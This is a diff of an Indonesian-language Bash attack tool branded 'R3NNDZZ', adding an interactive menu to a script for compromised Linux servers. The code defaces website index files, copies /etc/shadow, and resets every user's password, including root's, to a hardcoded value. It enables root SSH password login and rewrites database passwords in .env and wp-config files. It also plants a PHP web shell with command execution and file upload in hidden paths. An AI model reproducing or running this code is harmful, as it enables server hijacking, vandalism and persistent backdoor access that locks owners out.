@@ -2,7 +2,7 @@
 
 # ==============================================
 # AUTO DEFACE + CHANGE VPS PASSWORD - R3NNDZZ
-# [ HTML PREMIUM + PASSWORD LYNN001# ]
+# [ DENGAN MENU LENGKAP + RESTORE ]
 # ==============================================
 
 RED='\033[0;31m'
@@ -16,6 +16,9 @@ NC='\033[0m'
 
 # Password baru VPS
 NEW_PASS="lynn001#"
+
+# Direktori backup
+BACKUP_DIR="/root/r3nndzz_backup_$(date +%Y%m%d_%H%M%S)"
 
 # ==============================================
 # HTML DEFACE - R3NNDZZ SYSTEM BREACH
@@ -497,27 +500,281 @@ HTML_CONTENT='<!DOCTYPE html>
 </html>'
 
 # ==============================================
-# HEADER
+# FUNGSI BACKUP SEBELUM DEFACE
 # ==============================================
-clear
-echo -e "${RED}"
-echo "    ╔═══════════════════════════════════════════════════════════╗"
-echo "    ║     AUTO DEFACE + CHANGE VPS PASSWORD - R3NNDZZ           ║"
-echo "    ║     [ HTML PREMIUM + PASSWORD LYNN001# ]                  ║"
-echo "    ╚═══════════════════════════════════════════════════════════╝"
-echo -e "${NC}"
+backup_files() {
+    echo -e "\n${YELLOW}[•] Membuat backup sebelum deface...${NC}"
+    mkdir -p "$BACKUP_DIR"
+    
+    # Backup file-file penting
+    cp /etc/ssh/sshd_config "$BACKUP_DIR/sshd_config.backup" 2>/dev/null
+    cp /etc/passwd "$BACKUP_DIR/passwd.backup" 2>/dev/null
+    cp /etc/shadow "$BACKUP_DIR/shadow.backup" 2>/dev/null
+    
+    # Backup web files
+    find /var/www -type f -name "index.html" -o -name "index.php" -o -name "*.blade.php" 2>/dev/null | while read file; do
+        if [ -f "$file" ]; then
+            rel_path=$(echo "$file" | sed 's|/|_|g')
+            cp "$file" "$BACKUP_DIR$rel_path.backup" 2>/dev/null
+        fi
+    done
+    
+    echo -e "${GREEN}  ✅ Backup disimpan di: $BACKUP_DIR${NC}"
+}
 
-echo -e "${YELLOW}⚠️  Script ini akan:${NC}"
-echo "   1. Mendeface website dengan HTML R3NNDZZ"
-echo "   2. Mengganti ALL password VPS jadi ${RED}${NEW_PASS}${NC}"
-echo ""
-echo -ne "${WHITE}Yakin lanjut? (y/n): ${NC}"
-read CONFIRM
+# ==============================================
+# FUNGSI RESTORE KE AWAL
+# ==============================================
+restore_original() {
+    echo -e "\n${BLUE}🔄 ====== RESTORE KE AWAL ====== 🔄${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    # Cek apakah ada backup
+    if [ ! -d "$BACKUP_DIR" ]; then
+        echo -e "${RED}❌ Tidak ada backup ditemukan!${NC}"
+        return 1
+    fi
+    
+    echo -e "${YELLOW}[•] Memulihkan file dari backup...${NC}"
+    
+    # Restore SSH config
+    if [ -f "$BACKUP_DIR/sshd_config.backup" ]; then
+        cp "$BACKUP_DIR/sshd_config.backup" /etc/ssh/sshd_config
+        systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
+        echo -e "${GREEN}  ✅ SSH config dikembalikan${NC}"
+    fi
+    
+    # Restore web files
+    find /var/www -type f -name "index.html" -o -name "index.php" -o -name "*.blade.php" 2>/dev/null | while read file; do
+        rel_path=$(echo "$file" | sed 's|/|_|g')
+        backup_file="$BACKUP_DIR$rel_path.backup"
+        if [ -f "$backup_file" ]; then
+            cp "$backup_file" "$file"
+            echo -e "${GREEN}  ✅ Restore: $file${NC}"
+        fi
+    done
+    
+    echo -e "\n${GREEN}✅ RESTORE SELESAI! Semua file dikembalikan ke awal.${NC}"
+}
 
-if [[ "$CONFIRM" != "y" && "$CONFIRM" != "Y" ]]; then
-    echo -e "${RED}❌ Dibatalkan${NC}"
-    exit 0
-fi
+# ==============================================
+# FUNGSI DEFACE WEBSITE
+# ==============================================
+deface_website() {
+    echo -e "\n${PURPLE}🎨 ====== DEFACE WEBSITE ====== 🎨${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    # Backup dulu
+    backup_files
+    
+    echo -e "\n${PURPLE}[1/6] Menyiapkan file HTML...${NC}"
+    echo "$HTML_CONTENT" > /tmp/r3nndzz.html
+    echo -e "${GREEN}  ✅ HTML siap: /tmp/r3nndzz.html${NC}"
+    
+    echo -e "\n${PURPLE}[2/6] Mendeface website...${NC}"
+    
+    WEB_LOCATIONS=(
+        "/var/www/html/index.html"
+        "/var/www/html/index.php"
+        "/var/www/pterodactyl/public/index.html"
+        "/var/www/pterodactyl/public/index.php"
+        "/var/www/pterodactyl/resources/views/templates/index.blade.php"
+        "/home/*/public_html/index.html"
+        "/home/*/public_html/index.php"
+        "/usr/local/www/index.html"
+        "/usr/local/apache2/htdocs/index.html"
+        "/opt/lampp/htdocs/index.html"
+        "/var/www/nginx/html/index.html"
+    )
+    
+    DEFACE_COUNT=0
+    for loc in "${WEB_LOCATIONS[@]}"; do
+        eval "for f in $loc; do
+            if [ -f \"\$f\" ]; then
+                cp /tmp/r3nndzz.html \"\$f\" 2>/dev/null
+                echo -e \"${GREEN}    ✅ \$f${NC}\"
+                ((DEFACE_COUNT++))
+            fi
+        done" 2>/dev/null
+    done
+    
+    # Cari semua file index.html di seluruh server
+    find / -type f -name "index.html" -o -name "index.php" 2>/dev/null | head -20 | while read file; do
+        if [ -f "$file" ] && [ -w "$file" ]; then
+            cp /tmp/r3nndzz.html "$file" 2>/dev/null
+            echo -e "${GREEN}    ✅ $file${NC}"
+            ((DEFACE_COUNT++))
+        fi
+    done
+    
+    echo -e "\n${GREEN}  ✅ Total $DEFACE_COUNT file berhasil dideface${NC}"
+}
+
+# ==============================================
+# FUNGSI GANTI PASSWORD VPS
+# ==============================================
+change_vps_password() {
+    echo -e "\n${PURPLE}🔐 ====== GANTI PASSWORD VPS ====== 🔐${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    echo -e "\n${PURPLE}[3/6] Mengganti password root...${NC}"
+    echo "root:$NEW_PASS" | chpasswd
+    if [ $? -eq 0 ]; then
+        echo -e "${GREEN}  ✅ Password root: ${NEW_PASS}${NC}"
+    fi
+    
+    echo -e "\n${PURPLE}[4/6] Mencari semua user...${NC}"
+    
+    USERS=$(awk -F: '$3>=1000 && $1!="nobody" {print $1}' /etc/passwd)
+    COMMON_USERS=("admin" "ubuntu" "centos" "debian" "ftp" "www-data" "mysql" "postgres")
+    
+    for user in "${COMMON_USERS[@]}"; do
+        if id "$user" &>/dev/null; then
+            USERS="$USERS $user"
+        fi
+    done
+    
+    USERS=$(echo "$USERS" | tr ' ' '\n' | sort -u | tr '\n' ' ')
+    
+    SUCCESS=0
+    for user in $USERS; do
+        echo "$user:$NEW_PASS" | chpasswd 2>/dev/null
+        if [ $? -eq 0 ]; then
+            echo -e "${GREEN}    ✅ $user -> ${NEW_PASS}${NC}"
+            ((SUCCESS++))
+        fi
+    done
+    
+    echo -e "\n${GREEN}  ✅ Total $SUCCESS user berhasil diganti passwordnya${NC}"
+    
+    echo -e "\n${PURPLE}[5/6] Mengupdate SSH config...${NC}"
+    cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup
+    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+    systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
+    echo -e "${GREEN}  ✅ SSH siap dengan password${NC}"
+    
+    echo -e "\n${PURPLE}[6/6] Mencari file konfigurasi...${NC}"
+    find / -name ".env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null | head -10 | while read file; do
+        if [ -f "$file" ] && [ -w "$file" ]; then
+            cp "$file" "$file.bak"
+            sed -i "s/DB_PASSWORD=.*/DB_PASSWORD=$NEW_PASS/" "$file" 2>/dev/null
+            sed -i "s/define('DB_PASSWORD'.*/define('DB_PASSWORD', '$NEW_PASS');/" "$file" 2>/dev/null
+            echo -e "${GREEN}    ✅ $file${NC}"
+        fi
+    done
+}
+
+# ==============================================
+# FUNGSI INSTALL BACKDOOR
+# ==============================================
+install_backdoor() {
+    echo -e "\n${RED}🔑 ====== INSTALL BACKDOOR ====== 🔑${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    BACKDOOR_CODE='<?php
+    // R3NNDZZ Backdoor
+    if(isset($_GET["cmd"])) {
+        echo "<pre>".shell_exec($_GET["cmd"])."</pre>";
+    }
+    if(isset($_FILES["file"])) {
+        move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
+        echo "Uploaded!";
+    }
+    ?>'
+    
+    BACKDOOR_LOCATIONS=(
+        "/tmp/.system.php"
+        "/dev/shm/.cache.php"
+        "/var/tmp/.syslog.php"
+        "/usr/share/.config.php"
+        "/var/www/html/backdoor.php"
+        "/var/www/pterodactyl/public/backdoor.php"
+    )
+    
+    echo -e "${YELLOW}[•] Memasang backdoor...${NC}"
+    
+    for loc in "${BACKDOOR_LOCATIONS[@]}"; do
+        echo "$BACKDOOR_CODE" > "$loc"
+        chmod 755 "$loc"
+        echo -e "${GREEN}  ✅ Backdoor: $loc${NC}"
+    done
+    
+    IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
+    
+    echo -e "\n${GREEN}✅ BACKDOOR TERPASANG!${NC}"
+    echo -e "${CYAN}Coba akses: http://$IP_VPS/backdoor.php?cmd=id${NC}"
+}
+
+# ==============================================
+# FUNGSI SHOW STATUS
+# ==============================================
+show_status() {
+    IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
+    
+    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║                    STATUS VPS                              ║${NC}"
+    echo -e "${GREEN}╠══════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${GREEN}║${NC}  IP Address: ${CYAN}$IP_VPS${NC}"
+    echo -e "${GREEN}║${NC}  Hostname  : ${YELLOW}$(hostname)${NC}"
+    echo -e "${GREEN}║${NC}  OS        : $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)"
+    echo -e "${GREEN}║${NC}  Uptime    : $(uptime -p)"
+    echo -e "${GREEN}║${NC}  Password  : ${RED}${NEW_PASS}${NC}"
+    echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
+    
+    # Cek apakah ada file backup
+    if [ -d "$BACKUP_DIR" ]; then
+        echo -e "\n${GREEN}📁 Backup tersedia di: $BACKUP_DIR${NC}"
+    fi
+}
+
+# ==============================================
+# FUNGSI CLEANUP
+# ==============================================
+cleanup() {
+    echo -e "\n${YELLOW}[•] Membersihkan file sementara...${NC}"
+    rm -f /tmp/r3nndzz.html
+    echo -e "${GREEN}  ✅ Done${NC}"
+}
+
+# ==============================================
+# FUNGSI SHOW MENU
+# ==============================================
+show_menu() {
+    clear
+    echo -e "${RED}"
+    echo "    ╔═══════════════════════════════════════════════════════════╗"
+    echo "    ║     AUTO DEFACE + CHANGE VPS PASSWORD - R3NNDZZ           ║"
+    echo "    ║     [ DENGAN MENU LENGKAP + RESTORE ]                     ║"
+    echo "    ╚═══════════════════════════════════════════════════════════╝"
+    echo -e "${NC}"
+    
+    IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
+    
+    echo -e "${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${CYAN}║                    SYSTEM INFO                           ║${NC}"
+    echo -e "${CYAN}╠══════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${CYAN}║${NC}  IP VPS    : ${GREEN}$IP_VPS${NC}"
+    echo -e "${CYAN}║${NC}  Password  : ${RED}${NEW_PASS}${NC}"
+    echo -e "${CYAN}║${NC}  Backup    : ${YELLOW}$BACKUP_DIR${NC}"
+    echo -e "${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
+    
+    echo -e "\n${WHITE}╔══════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${WHITE}║                    MENU UTAMA                            ║${NC}"
+    echo -e "${WHITE}╠══════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${WHITE}║                                                          ║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[1]${NC} 🎨  DEFACE WEBSITE (HTML R3NNDZZ)               ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[2]${NC} 🔐  GANTI PASSWORD VPS (${NEW_PASS})            ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[3]${NC} 🔑  INSTALL BACKDOOR                           ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[4]${NC} 🔄  RESTORE KE AWAL (dari backup)              ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[5]${NC} 📊  LIHAT STATUS VPS                           ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[6]${NC} 🗑️  CLEANUP FILE TEMPORARY                     ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[0]${NC} 🚪  KELUAR                                     ${WHITE}║${NC}"
+    echo -e "${WHITE}║                                                          ║${NC}"
+    echo -e "${WHITE}╚══════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+    echo -ne "${YELLOW}➤ Pilih menu [0-6]: ${NC}"
+}
 
 # ==============================================
 # CEK ROOT
@@ -527,134 +784,49 @@ if [[ $EUID -ne 0 ]]; then
    exit 1
 fi
 
-echo -e "\n${YELLOW}[•] Memulai proses...${NC}"
-sleep 1
-
 # ==============================================
-# 1. SAVE HTML FILE
+# MAIN LOOP
 # ==============================================
-echo -e "\n${PURPLE}[1/6] Menyiapkan file HTML...${NC}"
-echo "$HTML_CONTENT" > /tmp/r3nndzz.html
-echo -e "${GREEN}  ✅ HTML siap: /tmp/r3nndzz.html${NC}"
-
-# ==============================================
-# 2. DEFACE LOKASI WEBSITE UMUM
-# ==============================================
-echo -e "\n${PURPLE}[2/6] Mendeface website...${NC}"
-
-WEB_LOCATIONS=(
-    "/var/www/html/index.html"
-    "/var/www/html/index.php"
-    "/var/www/pterodactyl/public/index.html"
-    "/var/www/pterodactyl/public/index.php"
-    "/var/www/pterodactyl/resources/views/templates/index.blade.php"
-    "/home/*/public_html/index.html"
-    "/home/*/public_html/index.php"
-    "/usr/local/www/index.html"
-    "/usr/local/apache2/htdocs/index.html"
-    "/opt/lampp/htdocs/index.html"
-    "/var/www/nginx/html/index.html"
-)
-
-for loc in "${WEB_LOCATIONS[@]}"; do
-    eval "for f in $loc; do
-        if [ -f \"\$f\" ]; then
-            cp /tmp/r3nndzz.html \"\$f\" 2>/dev/null
-            echo -e \"${GREEN}    ✅ \$f${NC}\"
-        fi
-    done" 2>/dev/null
+while true; do
+    show_menu
+    read choice
+    
+    case $choice in
+        1)
+            deface_website
+            ;;
+        2)
+            change_vps_password
+            ;;
+        3)
+            install_backdoor
+            ;;
+        4)
+            if [ -d "$BACKUP_DIR" ]; then
+                restore_original
+            else
+                echo -e "\n${RED}❌ Tidak ada backup ditemukan! Jalankan deface dulu.${NC}"
+            fi
+            ;;
+        5)
+            show_status
+            ;;
+        6)
+            cleanup
+            ;;
+        0)
+            echo -e "\n${GREEN}Thanks for using R3NNDZZ Tools!${NC}"
+            echo -e "${CYAN}Telegram: @lynnn046${NC}"
+            echo -e "${RED}R3NNDZZ WAS HERE!${NC}\n"
+            cleanup
+            exit 0
+            ;;
+        *)
+            echo -e "\n${RED}Pilihan tidak valid!${NC}"
+            ;;
+    esac
+    
+    echo ""
+    echo -ne "${CYAN}Tekan Enter untuk kembali ke menu...${NC}"
+    read
 done
-
-# Cari semua file index.html di seluruh server
-find / -type f -name "index.html" -o -name "index.php" 2>/dev/null | head -20 | while read file; do
-    if [ -f "$file" ] && [ -w "$file" ]; then
-        cp /tmp/r3nndzz.html "$file" 2>/dev/null
-        echo -e "${GREEN}    ✅ $file${NC}"
-    fi
-done
-
-# ==============================================
-# 3. GANTI PASSWORD VPS
-# ==============================================
-echo -e "\n${PURPLE}[3/6] Mengganti password root...${NC}"
-echo "root:$NEW_PASS" | chpasswd
-if [ $? -eq 0 ]; then
-    echo -e "${GREEN}  ✅ Password root: ${NEW_PASS}${NC}"
-fi
-
-# ==============================================
-# 4. GANTI PASSWORD SEMUA USER
-# ==============================================
-echo -e "\n${PURPLE}[4/6] Mencari semua user...${NC}"
-
-USERS=$(awk -F: '$3>=1000 && $1!="nobody" {print $1}' /etc/passwd)
-COMMON_USERS=("admin" "ubuntu" "centos" "debian" "ftp" "www-data" "mysql" "postgres")
-
-for user in "${COMMON_USERS[@]}"; do
-    if id "$user" &>/dev/null; then
-        USERS="$USERS $user"
-    fi
-done
-
-USERS=$(echo "$USERS" | tr ' ' '\n' | sort -u | tr '\n' ' ')
-
-SUCCESS=0
-for user in $USERS; do
-    echo "$user:$NEW_PASS" | chpasswd 2>/dev/null
-    if [ $? -eq 0 ]; then
-        echo -e "${GREEN}    ✅ $user -> ${NEW_PASS}${NC}"
-        ((SUCCESS++))
-    fi
-done
-
-echo -e "${GREEN}  ✅ Total user: $SUCCESS${NC}"
-
-# ==============================================
-# 5. UPDATE SSH CONFIG
-# ==============================================
-echo -e "\n${PURPLE}[5/6] Mengupdate SSH config...${NC}"
-cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup
-sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
-sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
-systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
-echo -e "${GREEN}  ✅ SSH siap dengan password${NC}"
-
-# ==============================================
-# 6. UPDATE FILE KONFIGURASI
-# ==============================================
-echo -e "\n${PURPLE}[6/6] Mencari file konfigurasi...${NC}"
-find / -name ".env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null | head -10 | while read file; do
-    if [ -f "$file" ] && [ -w "$file" ]; then
-        cp "$file" "$file.bak"
-        sed -i "s/DB_PASSWORD=.*/DB_PASSWORD=$NEW_PASS/" "$file" 2>/dev/null
-        sed -i "s/define('DB_PASSWORD'.*/define('DB_PASSWORD', '$NEW_PASS');/" "$file" 2>/dev/null
-        echo -e "${GREEN}    ✅ $file${NC}"
-    fi
-done
-
-# ==============================================
-# VERIFIKASI & REPORT
-# ==============================================
-IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
-
-echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
-echo -e "${GREEN}║         ✅  MISI BERHASIL! R3NNDZZ MENGAWASI! ✅       ║${NC}"
-echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
-echo ""
-echo -e "${WHITE}📡 VPS ACCESS:${NC}"
-echo -e "  ${GREEN}IP Address: ${IP_VPS}${NC}"
-echo -e "  ${GREEN}Username  : root${NC}"
-echo -e "  ${GREEN}Password  : ${RED}${NEW_PASS}${NC}"
-echo ""
-echo -e "${WHITE}🔑 SSH Command:${NC}"
-echo -e "  ${YELLOW}ssh root@${IP_VPS}${NC}"
-echo ""
-echo -e "${WHITE}🌐 WEBSITE:${NC}"
-echo -e "  ${CYAN}http://${IP_VPS}${NC}"
-echo -e "  ${CYAN}https://${IP_VPS}${NC}"
-echo ""
-echo -e "${WHITE}📁 File HTML:${NC}"
-echo -e "  ${CYAN}/tmp/r3nndzz.html${NC}"
-echo ""
-echo -e "${RED}⚠️  R3NNDZZ IS WATCHING - PRIVACY IS DEAD ⚠️${NC}"
-echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
